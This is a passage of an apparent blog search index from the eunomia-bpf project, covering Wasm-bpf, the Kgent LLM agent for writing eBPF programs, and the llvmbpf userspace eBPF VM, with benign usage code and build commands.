hand, eBPF can provide a fast and flexible extension to the system interface while ensuring the sandbox nature and portability of the Wasm environment.</p> <p>Currently, with the system interfaces provided by eBPF in the kernel and the ability to interact with user space, Wasm applications in Wasm-bpf can almost have the ability to access the data and return values of any function call in both kernel and user space (kprobe, uprobe, etc.). It can collect and understand all system calls with low overhead and obtain data packets and socket-level data for all network operations (tracepoint, socket, etc.). Additional protocol analyzers can be added in networking solutions, and any forwarding logic can be programmed easily (XDP, TC, etc.) without leaving the environment of packet processing in the Linux kernel.</p> <p>Moreover, eBPF has the ability to write data directly to the arbitrary address of any user space process (bpf_probe_write_user[7]), moderately modify the return value of kernel functions (bpf_override_return[8]), and even execute certain system calls directly in kernel space[9]. Fortunately, the eBPF bytecode undergoes strict security checks before being loaded into the kernel, ensuring that there are no memory overflows or other unsafe operations. Moreover, many functionalities that could expand the attack surface or introduce security risks require explicit enablement during kernel compilation. Similarly, specific eBPF features can be selectively enabled or disabled before loading the bytecode into the Wasm virtual machine, ensuring the security of the sandbox.</p> <p>All of these scenarios can be implemented within the Wasm lightweight container: unlike traditional Wasm usage as a data processing or control plugin, where these steps are implemented by logic outside the Wasm virtual machine, now they can be implemented within the Wasm lightweight container to access almost all system resources accessible by eBPF and provide complete control and interaction in both user and kernel space. Real-time generation of eBPF code can be used to change the behavior of the kernel logic, extending the programmability from user space to kernel space.</p>"},{"location":"blog/2023/02/11/wasm-bpf-bridging-webassembly-and-ebpf-for-kernel-programmability/#wasms-user-space-enhancements-for-ebpf-component-model","title":"Wasm's User-Space Enhancements for eBPF: Component Model","text":"<p>Standards are rarely the most exciting part of an ecosystem. And with a name like \"component model,\" it is indeed a challenging task to generate excitement. However, behind this boring name lies the most important innovation that Wasm brings to the software world.</p> <p>The component model describes how Wasm binary modules interact with each other. More specifically, two components can tell each other what services they provide and what expectations they need to fulfill. Then, Wasm modules can utilize each other's capabilities. This provides a new way for software developers to build applications. Developers can declare the components (or more abstractly, functionalities) that an application needs, and the Wasm runtime can assemble the correct set of components on behalf of the user. The component model is rapidly maturing and reference implementations have started to emerge. The year 2023 will be the year when the component model begins to redefine how we write software[10].</p> <p>Leveraging the Wasm ecosystem, especially Wasm-based lightweight container technology and component models, we can also empower eBPF applications with the following features:</p> <ul> <li><code>Portability</code>: Make eBPF tools and applications completely platform-independent and portable, without the need for recompilation for cross-platform distribution.</li> <li><code>Isolation</code>: Utilize the reliability and isolation capabilities of Wasm to make the loading and execution of eBPF programs and the data processing flow in user space more secure and reliable. In fact, the portion of eBPF application code controlling user space is usually much larger than the portion running in kernel space.</li> <li><code>Package Management</code>: Use the Wasm ecosystem and toolchain to distribute, manage, load, and run eBPF programs or tools. Currently, the eBPF program or tooling ecosystem lacks a universal package management or plugin management system.</li> <li><code>Language Independence</code>: Currently, eBPF programs are developed using various user space languages (such as Go, Rust, C, C++, Python, etc.), and more than 30 programming languages can be compiled into WebAssembly modules. This allows developers from different backgrounds (C, Go, Rust, Java, TypeScript, etc.) to write user space eBPF programs in their chosen language, without the need to learn a new language. We can even dynamically translate Wasm into eBPF programs and load them into the kernel or directly generate eBPF bytecode within the Wasm lightweight container.</li> <li><code>Agility</code>: For large eBPF applications, Wasm can serve as a plugin extension platform: extensions can be delivered and reloaded directly from the control plane at runtime. This means that anyone can load custom extensions with official and unmodified applications, and any bug fixes and/or updates to any eBPF program can be pushed and/or tested at runtime without the need for updating and/or redeploying a new binary. For observability applications that require updating data processing plugins, there is no need to go through the process of recompiling and deploying the entire application.</li> <li><code>Lightweight</code>: WebAssembly microservices consume 1% of the resources compared to Linux container applications, and the cold start time is only 1% compared to Linux container applications. For scenarios with a large number of small eBPF programs that need to be quickly deployed and stopped, the lightweight nature of Wasm greatly reduces system resource overhead.</li> </ul> <p>We have already made attempts to create Wasm-eBPF applications compliant with the OCI standard, utilizing ORAS to simplify the development, distribution, loading, and running of eBPF applications in the eBPF Hub of the LMP project[11]. We have also practiced developing user space data processing plugins for eBPF using multiple different languages simultaneously based on Wasm. With the latest Wasm-bpf framework, there are more exploratory possibilities to be pursued.</p>"},{"location":"blog/2023/02/11/wasm-bpf-bridging-webassembly-and-ebpf-for-kernel-programmability/#interaction-flow-between-user-space-and-ebpf-programs","title":"Interaction Flow Between User Space and eBPF Programs","text":"<p>eBPF programs are event-driven and run specific eBPF programs when a hook point is reached in the kernel or a user space application. To use an eBPF program, we first need to compile the corresponding source code to BPF bytecode using the clang/LLVM toolchain, which includes the definition of data structures, maps, and program segments (progs). Progs represent the program segments, and maps can be used to store data or communicate with user space. Next, we can use user space development frameworks and loading frameworks to implement a complete eBPF application.</p>"},{"location":"blog/2023/02/11/wasm-bpf-bridging-webassembly-and-ebpf-for-kernel-programmability/#typical-user-space-ebpf-development-framework","title":"Typical User Space eBPF Development Framework","text":"<p>For a complete eBPF application, we typically need to include both user space and kernel space components:</p> <ul> <li>User space programs interact with the kernel through a series of system calls (mainly bpf system calls), create the corresponding maps to store data in kernel space or communicate with user space, dynamically load different program segments based on configuration, dynamically modify bytecode or configure eBPF programs, load the bytecode information into the kernel, ensure security through a verifier, and implement bidirectional communication with the kernel through maps. Data can be passed from kernel to user space (or vice versa) using mechanisms such as ring buffers or perf buffers.</li> <li>The kernel space is responsible for specific computation logic and data collection.</li> </ul>"},{"location":"blog/2023/02/11/wasm-bpf-bridging-webassembly-and-ebpf-for-kernel-programmability/#a-new-ebpf-development-framework-built-on-user-space-wasm-ebpf-system-interfaces","title":"A New eBPF Development Framework Built on User Space Wasm-eBPF System Interfaces","text":"<p>This project can be seen as using the Wasm sandbox as another user space runtime built on top of the operating system, allowing Wasm applications to implement the same programming model and execution logic as typical user space eBPF applications. Wasm-bpf requires a runtime extension built outside the sandbox (the host) as well as runtime libraries compiled into Wasm bytecode within the sandbox to provide full support.</p> <p></p> <p>To achieve a comprehensive development model, we need:</p> <ul> <li>A Wasm module can correspond to multiple eBPF programs.</li> <li>An eBPF program instance can be shared by multiple Wasm modules.</li> <li>The eBPF program can be dynamically loaded into the kernel from the Wasm sandbox, select the desired mount point, mount or unmount, control the complete lifecycle of multiple eBPF bytecode objects, and support most eBPF program types.</li> <li>Support various types of maps and bidirectional communication with the kernel, supporting most maps types.</li> <li>Efficiently send information from kernel space to user space through ring buffers and perf event polling (or vice versa).</li> <li>Almost adaptable to all use cases using eBPF programs, with the ability to evolve and extend as kernel functionality evolves, without changes to the Wasm virtual machine system interface.</li> </ul> <p>This is the work that the Wasm-bpf project is doing. We have also proposed a new proposal for WASI: WASI-eBPF[12].</p> <p>In the Wasm-bpf project, all communication between the Wasm and eBPF virtual machines does not require serialization/deserialization mechanisms. With code generation techniques and support for BPF type format (BTF) information in the toolchain, we can achieve correct communication between different memory layouts, endianess, and pointer widths between eBPF and Wasm, with almost no additional overhead at runtime. When communicating through eBPF maps, data can be directly copied from kernel space to the memory of the Wasm virtual machine, avoiding additional overhead from multiple copies. Additionally, by automatically generating eBPF program skeletons (bpf code framework) and type definitions, the development experience for eBPF-Wasm programs in user space has been significantly improved.</p> <p>Thanks to the CO-RE (Compile-Once, Run Everywhere) technology provided by libbpf, there is no need to introduce additional recompilation processes when porting eBPF bytecode between different kernel versions, and there are no dependencies on LLVM/Clang in the runtime[14].</p> <p>A compiled eBPF-Wasm module typically only has a size of around 90Kb and can be dynamically loaded into the kernel and executed within less than 100ms. We provide several examples in the repository, corresponding to various scenarios such as observability, networking, and security, written in C/C++ or Rust.</p> <p>Thanks to the guidance and help from Associate Professor Xiaozheng Lai's team at South China University of Technology, Professor Lijun Chen's team at Xidian University, and Mr. Pu Wang and Mr. Jicheng Shi from Datan Technologies for combining Wasm and eBPF, we will continue to conduct further research and exploration on specific Wasm-bpf application scenarios with the students participating in the 2023 open-source capstone journey. In the next blog post, we will provide a more detailed analysis of the principles, performance, and corresponding code examples.</p> <p>The Wasm-bpf compilation toolchain and runtime module are currently developed and maintained by the eunomia-bpf open-source community[16], which is incubated by the eBPF Technology Exploration SIG[15] of the Lizard community. We would like to thank the PLCT Laboratory of the Institute of Software, Chinese Academy of Sciences for their strong support and funding for the community, as well as the contributions from community members. Moving forward, we will continue to improve and explore the corresponding Wasm and eBPF-related toolchains and runtime components and actively contribute to the upstream community.</p>"},{"location":"blog/2023/02/11/wasm-bpf-bridging-webassembly-and-ebpf-for-kernel-programmability/#references","title":"References","text":"<ul> <li>[1] wasm-bpf GitHub repository: https://github.com/eunomia-bpf/wasm-bpf</li> <li>[2] WebAssembly: Docker Without Containers: https://zhuanlan.zhihu.com/p/595257541</li> <li>[3] Cloud Native Project Scalability Tool WebAssembly Introduction: https://mp.weixin.qq.com/s/fap0bl6GFGi8zN5BFLpkCw</li> <li>[4] When Wasm Meets eBPF: Writing, Distributing, Loading, and Running eBPF Programs with WebAssembly: https://zhuanlan.zhihu.com/p/573941739</li> <li>[5] https://ebpf.io/</li> <li>[6] What is eBPF: https://ebpf.io/what-is-ebpf</li> <li>[7] Offensive BPF: Understanding and using bpf_probe_write_user: https://embracethered.com/blog/posts/2021/offensive-bpf-libbpf-bpf_probe_write_user/</li> <li>[8] Cloud-Native Security Attack and Defense: Analysis and Practice of Container Technology based on eBPF Escape: https://security.tencent.com/index.php/blog/msg/206</li> <li>[9] kernel-versions.md: https://github.com/iovisor/bcc/blob/master/docs/kernel-versions.md</li> <li>[10] 5 WebAssembly Trends Predicted for 2023: https://zhuanlan.zhihu.com/p/597705400</li> <li>[11] LMP eBPF-Hub: https://github.com/linuxkerneltravel/lmp</li> <li>[12] WASI-eBPF: https://github.com/WebAssembly/WASI/issues/513</li> <li>[13] BPF BTF Explained: https://www.ebpf.top/post/kernel_btf/</li> <li>[14] BPF Portability and CO-RE (Compile Once, Run Everywhere): https://cloud.tencent.com/developer/article/1802154</li> <li>[15] eBPF Technology Exploration SIG of the Lizard Community: https://openanolis.cn/sig/ebpfresearch</li> <li>[16] eunomia-bpf project: https://github.com/eunomia-bpf/eunomia-bpf</li> <li>[17] eunomia-bpf project on Gitee: https://gitee.com/anolis/eunomia</li> </ul> <p>Share on  Share on </p>"},{"location":"blog/2024/07/11/simplifying-kernel-programming-the-llm-powered-ebpf-tool/","title":"Simplifying Kernel Programming: The LLM-Powered eBPF Tool","text":"<p>Kernel programming can be intimidating, requiring deep knowledge of operating system internals and programming constraints. Our latest tool, Kgent, aims to change that by making it easier than ever to create extended Berkeley Packet Filters (eBPF) programs. Kgent leverages the power of large language models (LLMs) to translate natural language prompts into eBPF code, opening up kernel programming to a wider audience.</p> <p>Our paper, \"Kgent: Kernel Extensions Large Language Model Agent,\" was recently presented at eBPF '24: Proceedings of the ACM SIGCOMM 2024 Workshop on eBPF and Kernel Extensions. Let's dive into what makes Kgent a game-changer for kernel programming.</p>"},{"location":"blog/2024/07/11/simplifying-kernel-programming-the-llm-powered-ebpf-tool/#the-key-idea-behind-kgent","title":"The Key Idea Behind Kgent","text":"<p>Kgent simplifies the traditionally complex process of writing eBPF programs. By translating user prompts in natural language to eBPF code, it eliminates the need for deep OS kernel knowledge. This tool combines program comprehension, symbolic execution, and feedback loops to ensure the synthesized program is accurate and aligns with the user's intent.</p>"},{"location":"blog/2024/07/11/simplifying-kernel-programming-the-llm-powered-ebpf-tool/#highlights","title":"Highlights","text":"<ul> <li>Natural Language to eBPF: Kgent can take user prompts in plain English and convert them into functional eBPF programs.</li> <li>Combination of Techniques: It employs a mix of program comprehension, symbolic execution, and feedback loops to ensure high accuracy.</li> <li>Evaluation: Our tests show that Kgent achieves a 2.67x improvement over GPT-4 in producing correct eBPF programs, with a high accuracy rate and minimal false positives.</li> </ul>"},{"location":"blog/2024/07/11/simplifying-kernel-programming-the-llm-powered-ebpf-tool/#potential-use-cases","title":"Potential Use Cases","text":"<p>Kgent can be utilized in various scenarios to facilitate kernel development and management:</p> <ol> <li>System Administrators: Helps junior sys admins create and maintain eBPF programs without needing extensive OS kernel knowledge.</li> <li>DevOps Personnel: Assists in writing and deploying kernel extensions for monitoring and tracing applications, enhancing system performance and security.</li> <li>Patch Makers: Simplifies the creation of patches by translating natural language descriptions of issues and fixes into eBPF programs.</li> <li>Kernel Developers: Speeds up the prototyping and validation of kernel extensions, saving time and reducing errors.</li> <li>Educational Purposes: Serves as a learning aid for students and new developers to understand eBPF programming through natural language interactions.</li> <li>Research and Experimentation: Provides a platform for researchers to explore new eBPF applications and test hypotheses without diving into complex coding.</li> <li>Network Tools Development: Eases the creation of custom network monitoring, security, and performance analysis tools by translating high-level requirements into efficient eBPF programs.</li> </ol>"},{"location":"blog/2024/07/11/simplifying-kernel-programming-the-llm-powered-ebpf-tool/#why-we-need-kgent-instead-of-just-ask-gpt","title":"Why we need kgent instead of just ask GPT?","text":"<p>While large language models (LLMs) like GPT-4 can suggest code, they often recommend incorrect helpers or non-existent APIs\u2014a phenomenon known as hallucination. Given the small and limited set of helpers and kfuncs in eBPF, these issues can be fixed relatively easily. Another common issue is incorrect attach points. In eBPF, programs must attach to specific kernel events, such as kprobes, tracepoints, and perf events. Incorrect attach events can either be rejected by the kernel or, worse, pass the verifier and load incorrectly, leading to wrong results.</p> <p>The eBPF verifier adds another layer of complexity. For instance, loop code often cannot pass the verifier due to safety checks. Although the verifier prevents harmful code, it cannot always prevent incorrect code. For example, when asked to write a program to trace TCP connect events, GPT-4's generated code failed to read the port number correctly and didn't consider IPv6.</p> <p>To help the LLM learn about new knowledge like eBPF, common approaches include fine-tuning or Retrieval-Augmented Generation (RAG). However, publicly available examples of eBPF are insufficient, and eBPF abilities can change across kernel versions. RAG is a promising solution, as it allows the model to retrieve the most up-to-date and relevant information from external sources. This method combines language model generation with relevant information retrieval from a vector database.</p>"},{"location":"blog/2024/07/11/simplifying-kernel-programming-the-llm-powered-ebpf-tool/#the-llm-agent-framework","title":"The LLM Agent Framework","text":"<p>To address these issues, we built an LLM agent with three core components: planning, tools, and memory.</p> <p></p> <p>Plan Component The agent follows a predefined workflow:</p> <ol> <li>Prompter: Retrieves related examples, attach points, and specs based on user input.</li> <li>Synthesis Engine: Creates eBPF candidates from the prompt.</li> <li>Comprehension Engine: Annotates the eBPF candidate, adding necessary assumptions and assertions for verification.</li> <li>Symbolic Verifier: Verifies the candidate's behavior. If invalid, the process iterates until a valid program is produced, forming a feedback loop. For some cases, it can also use ReAct mode for decision-making.</li> </ol> <p></p> <p>Tools Component The agent can use various tools like clang to compile eBPF programs, Seahorn for verification, and bpftrace for obtaining attach points and running eBPF programs.</p> <p>Memory Component The agent uses short-term in-context memory to remember past actions, errors, and decisions, ensuring the feedback loop is successful.</p> <p>Example Workflow Let\u2019s take a simple bpftrace program as an example. Suppose a user requests: \"Trace tcp_connect events for both IPv4 and IPv6 connection attempts, and display the source and destination IP addresses.\" The agent forms a prompt based on a predefined template and asks the LLM to generate the program. We use in-context learning and few-shot techniques, including examples in the template's context. The examples vector database contains samples from BCC, bpftrace, and our own collection. The agent searches for similar examples based on user input and includes these examples in the prompt.</p> <p>We also built a pipeline to generate specifications and descriptions for each hook point and helper function from the kernel source code. For instance, when building the spec database, we generate the spec for the tcp_connect_init function in the kernel using the LLM. During the synthesis step, the agent can search for related function specs with user input in the vector database.</p>"},{"location":"blog/2024/07/11/simplifying-kernel-programming-the-llm-powered-ebpf-tool/#limitations-and-future-work","title":"Limitations and Future Work","text":"<p>While Kgent is a significant step forward, it has some limitations. Currently, our implementation focuses on small programs under 100 lines due to the LLM's context window limit. Additionally, our eBPF program dataset is relatively small, which restricts the tool's ability to handle more complex and varied tasks. Right now, Kgent's use cases are mostly limited to simple trace programs and network functions.</p> <p>We are exploring ways to extend Kgent's capabilities. For example, we know that tools like ChatGPT can handle many tasks using its Python code interpreter. This raises exciting possibilities: can we automate larger tasks like auto-monitoring and auto-performance tuning? Could an LLM help analyze results from different tools and even find these tools automatically? Could it play a role in rapidly developing solutions for urgent problems?</p> <p>To tackle these challenges, we are considering splitting larger tasks into smaller, manageable parts, similar to the approach used by AutoGPT. This would allow the LLM to plan the overall structure of the program, generate each component, and then merge them together. Additionally, involving users in the iteration process could provide interactive feedback, improving the quality of the generated programs.</p> <p>We also acknowledge that writing correct Hoare contracts is challenging for LLMs, and current verification methods may not cover all behaviors of the generated eBPF programs. To improve this, we need better background descriptions and more robust Hoare expressions. Incorporating more software engineering practices, such as counterexample generation and test-driven development, could help ensure comprehensive verification.</p> <p>Another critical concern is security. Since eBPF runs in the kernel, any flaws could lead to significant issues. We plan to involve users more in the review process to mitigate these risks and ensure the safety of the generated programs.</p>"},{"location":"blog/2024/07/11/simplifying-kernel-programming-the-llm-powered-ebpf-tool/#conclusion","title":"Conclusion","text":"<p>Kgent is revolutionizing the way we approach kernel programming by making eBPF program creation accessible to a broader audience. By translating natural language into functional eBPF code, it opens up kernel extension development to system administrators, DevOps personnel, patch makers, and more. Our paper, presented at eBPF '24, highlights the potential of this tool to democratize kernel programming and foster innovation.</p> <p>We invite you to explore Kgent and see how it can transform your approach to kernel development. For more details, check out our eBPF'24 paper and visit our GitHub repository. For additional details, refer to the earlier Arxiv version: KEN: Kernel Extensions using Natural Language. For a more usable and simplified tool, check out GPTtrace. You can also try the GPTtrace simplified web demo here.</p> <p>By lowering the barrier to entry for writing eBPF programs, Kgent is promoting innovation and enhancing system capabilities, one natural language prompt at a time.</p> <p>Share on  Share on </p>"},{"location":"blog/2024/09/10/building-high-performance-userspace-ebpf-vms-with-llvm/","title":"Building High-Performance Userspace eBPF VMs with LLVM","text":"<p>We are excited to introduce llvmbpf, a new project aimed at empowering developers with a high-performance, multi-architecture eBPF virtual machine (VM) that leverages the LLVM framework for Just-In-Time (JIT) and Ahead-Of-Time (AOT) compilation.</p> <p>This component is part of the bpftime project but focuses solely on the core VM. It operates as a standalone eBPF VM library or a compiler tool. This library is optimized for performance, flexibility, and minimal dependencies, making it easy to integrate into various environments without unnecessary overhead.</p>"},{"location":"blog/2024/09/10/building-high-performance-userspace-ebpf-vms-with-llvm/#why-llvmbpf","title":"Why llvmbpf?","text":"<p>Although there are several userspace eBPF runtimes available, we built llvmbpf to address specific needs that existing solutions may not fully satisfy:</p> <ol> <li> <p>AOT Compiler: The ability to compile eBPF bytecode into native ELF object files allows developers to deploy pre-compiled eBPF programs, ensuring high performance and efficiency, especially in resource-constrained environments. Additionally, it can allow you to experiment with different optimization techniques based on LLVM IR, providing more flexibility and control over the compilation process.</p> </li> <li> <p>Standalone Deployment: With llvmbpf, you can build eBPF programs into standalone binaries that don\u2019t require external dependencies. This feature is particularly useful for deploying eBPF programs on embedded systems, microcontrollers, or other environments where installing additional software is impractical. Compared to native C code development, this ensures the eBPF part is verified after integration with the verifier.</p> </li> <li> <p>All-Architecture Support: llvmbpf is designed to be compatible across multiple architectures, making it versatile for a wide range of hardware platforms.</p> </li> <li> <p>Maps and Relocation Support: Unlike many other userspace eBPF solutions, llvmbpf provides robust support for maps, data relocation, and <code>lddw</code> helper functions, allowing for the creation of more complex and powerful eBPF programs.</p> </li> <li> <p>Extensible Optimization Approaches: Leveraging LLVM\u2019s powerful optimization capabilities, llvmbpf allows for advanced optimizations such as inlining maps and helper functions, as well as using original LLVM IR for enhanced performance. </p> </li> </ol> <p>In this blog, we\u2019ll walk through some practical examples of how to use llvmbpf, highlighting its core features and capabilities.</p> <p>For a comprehensive userspace eBPF runtime that includes support for maps, helpers, and seamless execution of Uprobe, syscall trace, XDP, and other eBPF programs\u2014similar to kernel functionality but in userspace\u2014please refer to the bpftime project.</p>"},{"location":"blog/2024/09/10/building-high-performance-userspace-ebpf-vms-with-llvm/#getting-started-with-llvmbpf","title":"Getting Started with llvmbpf","text":""},{"location":"blog/2024/09/10/building-high-performance-userspace-ebpf-vms-with-llvm/#using-llvmbpf-as-a-library","title":"Using llvmbpf as a Library","text":"<p>llvmbpf can be used as a library within your application to load and execute eBPF programs. Here\u2019s a basic example:</p> <pre><code>void run_ebpf_prog(const void *code, size_t code_len) {\n    uint64_t res = 0;\n    llvmbpf_vm vm;\n\n    res = vm.load_code(code, code_len);\n    if (res) {\n        return;\n    }\n    vm.register_external_function(2, \"print\", (void *)ffi_print_func);\n    auto func = vm.compile();\n    if (!func) {\n        return;\n    }\n    int err = vm.exec(&amp;bpf_mem, sizeof(bpf_mem), res);\n    if (err != 0) {\n        return;\n    }\n    printf(\"res = %\" PRIu64 \"\\n\", res);\n}\n</code></pre> <p>This snippet shows how you can load eBPF bytecode, register external functions, and execute the program within the VM.</p>"},{"location":"blog/2024/09/10/building-high-performance-userspace-ebpf-vms-with-llvm/#using-llvmbpf-as-an-aot-compiler","title":"Using llvmbpf as an AOT Compiler","text":"<p>One of the most powerful features of llvmbpf is its ability to function as an AOT compiler, converting eBPF bytecode into native ELF object files. This approach not only boosts performance but also simplifies the deployment of eBPF programs.</p> <p>You can use the CLI to generate LLVM IR from eBPF bytecode:</p> <pre><code># ./build/cli/bpftime-vm build .github/assets/sum.bpf.o -emit-llvm &gt; test.bpf.ll\n# opt -O3 -S test.bpf.ll -opaque-pointers -o test.opt.ll\n# cat test.opt.ll\n</code></pre> <p>AOT Compile an eBPF program:</p> <pre><code># ./build/cli/bpftime-vm build .github/assets/sum.bpf.o\n[info] Processing program test\n[info] Program test written to ./test.o\n</code></pre> <p>Load and run an AOT-compiled eBPF program:</p> <pre><code># echo \"AwAAAAEAAAACAAAAAwAAAA==\" | base64 -d &gt; test.bin\n# ./build/cli/bpftime-vm run test.o test.bin\n[info] LLVM-JIT: Loading aot object\n[info] Program executed successfully. Return value: 6\n</code></pre> <p>The resulting ELF object file can be linked with other object files or loaded directly into the llvmbpf runtime, making it highly versatile for different use cases.</p>"},{"location":"blog/2024/09/10/building-high-performance-userspace-ebpf-vms-with-llvm/#loading-ebpf-bytecode-from-elf-files","title":"Loading eBPF Bytecode from ELF Files","text":"<p>llvmbpf supports loading eBPF bytecode directly from ELF files, which is a common format for storing compiled eBPF programs. This feature is particularly useful when working with existing eBPF toolchains.</p> <pre><code>bpf_object *obj = bpf_object__open(ebpf_elf.c_str());\nif (!obj) {\n    return 1;\n}\nstd::unique_ptr&lt;bpf_object, decltype(&amp;bpf_object__close)&gt; elf(\n    obj, bpf_object__close);\n\nbpf_program *prog;\nfor ((prog) = bpf_object__next_program((elf.get()), nullptr);\n     (prog) != nullptr;\n     (prog) = bpf_object__next_program((elf.get()), (prog))) {\n    llvmbpf_vm vm;\n    vm.load_code((const void *)bpf_program__insns(prog),\n                 (uint32_t)bpf_program__insn_cnt(prog) * 8);\n}\n</code></pre> <p>However, the <code>bpf.o</code> ELF file has no map and data relocation support. We recommend using bpftime to load and relocate the eBPF bytecode from an ELF file. This includes:</p> <ul> <li>Writing a loader similar to the kernel eBPF loader to load the eBPF bytecode (see an example here).</li> <li>Using libbpf, which supports:</li> <li>Relocation for maps, where the map ID is allocated by the loader and bpftime. You can use the map ID to access maps through the helpers.</li> <li>Accessing data through the <code>lddw</code> helper function.</li> <li>After loading the eBPF bytecode and completing relocation, you can use the bpftimetool to dump the map information and eBPF bytecode.</li> </ul>"},{"location":"blog/2024/09/10/building-high-performance-userspace-ebpf-vms-with-llvm/#maps-and-data-relocation-support","title":"Maps and Data Relocation Support","text":"<p>llvmbpf offers extensive support for maps and data relocation, allowing developers to write more complex eBPF programs that interact with different data sources. For instance, you can use helper functions to access maps or define maps as global variables in your eBPF programs.</p> <p>The eBPF can work with maps in two ways:</p> <ul> <li>Using helper functions to access the maps, like <code>bpf_map_lookup_elem</code>, <code>bpf_map_update_elem</code>, etc.</li> <li>Using maps as global variables in the eBPF program and accessing the maps directly.</li> </ul> <pre><code>uint32_t ctl_array[2] = { 0, 0 };\nuint64_t cntrs_array[2] = { 0, 0 };\n\nvoid *bpf_map_lookup_elem(uint64_t map_fd, void *key) {\n    if (map_fd == 5) {\n        return &amp;ctl_array[*(uint32_t *)key];\n    } else if (map_fd == 6) {\n        return &amp;cntrs_array[*(uint32_t *)key];\n    } else {\n        return nullptr;\n    }\n}\n</code></pre>"},{"location":"blog/2024/09/10/building-high-performance-userspace-ebpf-vms-with-llvm/#building-into-standalone-binary-for-deployment","title":"Building into Standalone Binary for Deployment","text":"<p>One of the standout features of llvmbpf is the ability to compile eBPF programs into standalone binaries. This makes it possible to deploy eBPF applications in environments where installing dependencies is not feasible, such as microcontrollers or other embedded systems.</p> <p>You can build the eBPF program into a standalone binary that does not rely on any external libraries and can be executed like normal C code with helper and map support.</p> <p>This approach offers several benefits:</p> <ul> <li>Easily deploy the eBPF program to any machine without needing to install dependencies.</li> <li>Avoid the overhead of loading the eBPF bytecode and maps at runtime.</li> <li>Make it suitable for microcontrollers or embedded systems that do not have an OS.</li> </ul> <p>Here\u2019s a basic example:</p> <pre><code>#include &lt;stdint.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;inttypes.h&gt;\n\nint bpf_main(void* ctx, uint64_t size);\n\nuint32_t ctl_array[2] = { 0, 0 };\nuint64_t cntrs_array[2] = { 0, 0 };\n\nvoid *_bpf_helper_ext_0001(uint64_t map_fd, void *key) {\n  printf(\"bpf_map_lookup_elem %lu\\n\", map_fd);\n  if (map_fd == 5) {\n    return &amp;ctl_array[*(uint32_t *)key];\n  } else if (map\n\n_fd == 6) {\n    return &amp;cntrs_array[*(uint32_t *)key];\n  } else {\n    return NULL;\n  }\n}\n\nvoid* __lddw_helper_map_val(uint64_t val) {\n    printf(\"map_val %lu\\n\", val);\n    if (val == 5) {\n        return (void *)ctl_array;\n    } else if (val == 6) {\n        return (void *)cntrs_array;\n    } else {\n        return NULL;\n    }\n}\n\nuint8_t bpf_mem[] = { 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88 };\n\nint main() {\n    printf(\"The value of cntrs_array[0] is %\" PRIu64 \"\\n\", cntrs_array[0]);\n    printf(\"calling ebpf program...\\n\");\n    bpf_main(bpf_mem, sizeof(bpf_mem));\n    printf(\"The value of cntrs_array[0] is %\" PRIu64 \"\\n\", cntrs_array[0]);\n    return 0;\n}\n</code></pre> <p>Compile the C code with the LLVM IR:</p> <pre><code>clang -g main.c xdp-counter.ll -o standalone \n</code></pre> <p>You can then run the <code>standalone</code> eBPF program directly. Compared to native C code development, this ensures that the eBPF part is verified after integration with the verifier.</p>"},{"location":"blog/2024/09/10/building-high-performance-userspace-ebpf-vms-with-llvm/#optimization-techniques","title":"Optimization Techniques","text":"<p>llvmbpf provides several optimization techniques to enhance the performance of eBPF programs. Two notable methods include:</p>"},{"location":"blog/2024/09/10/building-high-performance-userspace-ebpf-vms-with-llvm/#inlining-maps-and-helper-functions","title":"Inlining Maps and Helper Functions","text":"<p>By inlining maps and helper functions, llvmbpf reduces the overhead of function calls, enabling more efficient execution of eBPF programs.</p> <pre><code>clang -S -O3 -emit-llvm libmap.c -o libmap.ll\nllvm-link -S -o xdp-counter-inline.ll xdp-counter.ll libmap.ll\nopt --always-inline -S xdp-counter-inline.ll -o xdp-counter-inline.ll\n</code></pre>"},{"location":"blog/2024/09/10/building-high-performance-userspace-ebpf-vms-with-llvm/#using-original-llvm-ir-from-c-code","title":"Using Original LLVM IR from C Code","text":"<p>Instead of relying solely on eBPF instructions, llvmbpf allows developers to use original LLVM IR generated from C code. This flexibility opens the door for more advanced optimizations and higher performance.</p> <pre><code>int bpf_main(void* ctx, int size) {\n    _bpf_helper_ext_0006(\"hello world: %d\\n\", size);\n    return 0;\n}\n</code></pre> <p>eBPF is an instruction set designed for verification, but it may not be the best for performance. llvmbpf also supports using the original LLVM IR from C code. See example/load-llvm-ir for an example. You can:</p> <ul> <li>Compile the C code to eBPF for verification.</li> <li>Compile the C code to LLVM IR and native code for execution in the VM.</li> </ul>"},{"location":"blog/2024/09/10/building-high-performance-userspace-ebpf-vms-with-llvm/#conclusion","title":"Conclusion","text":"<p>llvmbpf is a powerful tool for developers looking to leverage eBPF outside the kernel. With features like AOT compilation, standalone deployment, and extensive support for maps and relocation, it offers a flexible and high-performance solution for a wide range of use cases. Whether you\u2019re working on networking, security, or performance monitoring applications, llvmbpf provides the tools you need to build efficient and portable eBPF programs.</p>"},{"location":"blog/2024/09/10/building-high-performance-userspace-ebpf-vms-with-llvm/#links","title":"Links","text":"<ul> <li>llvmbpf</li> <li>bpftime</li> <li>LLVM BPF Examples</li> <li>eBPF ISA</li> </ul> <p>Share on  Share on </p>"},{"location":"blog/2022/10/11/%E5%A6%82%E4%BD%95%E5%9C%A8-linux-%E6%98%BE%E5%BE%AE%E9%95%9Clmp%E9%A1%B9%E7%9B%AE%E4%B8%AD%E5%BC%80%E5%90%AF-ebpf-%E4%B9%8B%E6%97%85/","title":"\u5982\u4f55\u5728 Linux \u663e\u5fae\u955c\uff08LMP\uff09\u9879\u76ee\u4e2d\u5f00\u542f eBPF \u4e4b\u65c5\uff1f","text":"<p>eBPF \u4e3a Linux \u5185\u6838\u63d0\u4f9b\u4e86\u53ef\u6269\u5c55\u6027\uff0c\u4f7f\u5f00\u53d1\u4eba\u5458\u80fd\u591f\u5bf9 Linux \u5185\u6838\u8fdb\u884c\u7f16\u7a0b\uff0c\u4ee5\u4fbf\u6839\u636e\u4ed6\u4eec\u7684\u4e1a\u52a1\u9700\u6c42\u5feb\u901f\u6784\u5efa\u667a\u80fd\u7684\u6216\u4e30\u5bcc\u7684\u529f\u80fd\u3002</p> <p>\u6211\u4eec\u7684 LMP(Linux Microscope) \u9879\u76ee \u662f\u4e3a\u4e86\u5145\u5206\u6316\u6398 ebpf \u7684\u53ef\u80fd\u6027\u800c\u5efa\u7acb\u7684\uff0c\u9879\u76ee\u4ee5\u6784\u5efa eBPF \u5b66\u4e60\u793e\u533a\u3001\u6210\u4e3a eBPF \u5de5\u5177\u96c6\u6563\u5730\u3001\u5b75\u5316 eBPF 